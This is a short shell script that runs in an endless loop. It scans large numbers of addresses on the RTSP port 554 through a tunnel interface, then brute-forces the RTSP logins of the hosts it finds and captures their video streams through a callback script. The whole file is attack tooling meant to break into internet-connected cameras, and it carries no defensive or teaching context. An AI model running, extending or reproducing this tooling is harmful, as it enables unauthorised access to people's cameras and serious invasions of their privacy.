#!/usr/bin/env sh
while true; do
    echo
    echo Remove hosts
    rm ./local/hosts_554.txt
    echo
    echo Gather IPs
    ./fortune_port.py 554 250000 1024 -i tun0
    echo
    echo Brute
    ./rtsp_brute.py -v 3 \
        -ht 1024 -sp \
        -i tun0 \
        --capture --capture_callback local/campost.sh
done

